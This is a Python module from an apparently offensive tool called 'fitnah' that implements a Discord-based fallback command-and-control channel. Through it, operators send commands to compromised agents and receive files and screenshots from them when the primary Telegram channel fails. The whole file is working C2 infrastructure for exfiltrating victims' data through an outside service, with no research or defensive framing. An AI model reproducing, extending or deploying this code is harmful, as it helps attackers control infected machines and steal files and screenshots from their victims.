"""
Discord transport — fallback C2 channel (priority 1).

Activates automatically when Telegram fails N consecutive times.
Does not support inline keyboards — uses plain text menus instead.
"""
from __future__ import annotations

import asyncio
import io
import logging
from typing import AsyncIterator

import discord
from discord import TextChannel, Message

from fitnah.c2.transport.base import AbstractTransport

log = logging.getLogger(__name__)

_MAX_MSG     = 2000   # Discord hard limit per message
_MAX_CAPTION = 1900
_READY_WAIT  = 30     # seconds to wait for on_ready before giving up


class DiscordTransport(AbstractTransport):
    name     = "discord"
    priority = 1

    def __init__(
        self,
        token: str,
        operator_channel_id: int,
        allowed_ids: list[int] | None = None,
    ):
        self._token          = token
        self._channel_id     = operator_channel_id
        self._allowed_ids    = set(allowed_ids or [])

        self._queue: asyncio.Queue[dict] = asyncio.Queue()
        self._client: discord.Client | None = None
        self._channel: TextChannel | None   = None
        self._alive  = False
        self._task: asyncio.Task | None = None
        self._ready  = asyncio.Event()

    # ── lifecycle ─────────────────────────────────────────────────────────
    async def connect(self) -> None:
        intents = discord.Intents.default()
        intents.message_content = True
        self._client = discord.Client(intents=intents)
        self._ready.clear()

        @self._client.event
        async def on_ready():
            ch = self._client.get_channel(self._channel_id)
            if ch is None:
                log.error(
                    "[discord] channel %s not found — check operator_channel_id",
                    self._channel_id,
                )
                return
            self._channel = ch
            self._alive   = True
            self._ready.set()
            log.info("[discord] connected  channel=%s", self._channel_id)

        @self._client.event
        async def on_message(msg: Message):
            if msg.author == self._client.user:
                return
            if msg.channel.id != self._channel_id:
                return

            sender_id = msg.author.id
            if self._allowed_ids and sender_id not in self._allowed_ids:
                log.warning(
                    "[discord] message from unknown sender %s — dropped", sender_id
                )
                return

            await self._queue.put({
                "chat_id":    str(msg.channel.id),
                "sender_id":  str(sender_id),
                "text":       msg.content,
                "raw":        msg,
                "_transport": self.name,
            })

        @self._client.event
        async def on_disconnect():
            self._alive = False
            log.warning("[discord] disconnected")

        # start the client in a background task
        self._task = asyncio.create_task(self._client.start(self._token))

        # wait for on_ready with a timeout
        try:
            await asyncio.wait_for(self._ready.wait(), timeout=_READY_WAIT)
        except asyncio.TimeoutError:
            log.error("[discord] timed out waiting for on_ready — check token/channel")
            await self.disconnect()
            raise RuntimeError("Discord failed to connect within timeout")

    async def disconnect(self) -> None:
        self._alive = False
        if self._client:
            try:
                await self._client.close()
            except Exception as exc:
                log.warning("[discord] error closing client: %s", exc)
        if self._task and not self._task.done():
            self._task.cancel()
            try:
                await self._task
            except (asyncio.CancelledError, Exception):
                pass
        log.info("[discord] disconnected")

    # ── send ──────────────────────────────────────────────────────────────
    async def send(self, chat_id: str, text: str) -> None:
        ch = await self._resolve_channel(chat_id)
        for chunk in _chunk(text, _MAX_MSG):
            await ch.send(chunk)

    async def send_file(
        self, chat_id: str, filename: str, data: bytes, caption: str = ""
    ) -> None:
        ch = await self._resolve_channel(chat_id)
        content = caption[:_MAX_CAPTION] if caption else f"`{filename}`"
        await ch.send(
            content=content,
            file=discord.File(fp=io.BytesIO(data), filename=filename),
        )

    async def send_photo(self, chat_id: str, data: bytes, caption: str = "") -> None:
        await self.send_file(
            chat_id, "screenshot.png", data, caption or "screenshot"
        )

    async def send_to_operator(self, text: str) -> None:
        await self.send(str(self._channel_id), text)

    # ── listen ────────────────────────────────────────────────────────────
    async def listen(self) -> AsyncIterator[dict]:
        while self._alive:
            msg = await self._queue.get()
            yield msg

    # ── helpers ───────────────────────────────────────────────────────────
    async def _resolve_channel(self, chat_id: str) -> TextChannel:
        """
        Resolve a channel by ID. Falls back to the operator channel
        if the specific chat_id is not found (Discord has no per-agent groups).
        """
        if not self._client:
            raise RuntimeError("Discord not connected")

        ch = self._client.get_channel(int(chat_id))
        if ch is None:
            ch = self._channel   # fallback to operator channel
        if ch is None:
            raise RuntimeError("No Discord channel available")
        return ch

    # ── status ────────────────────────────────────────────────────────────
    @property
    def is_alive(self) -> bool:
        return self._alive


# ── helpers ───────────────────────────────────────────────────────────────────

def _chunk(text: str, size: int) -> list[str]:
    return [text[i: i + size] for i in range(0, max(len(text), 1), size)]
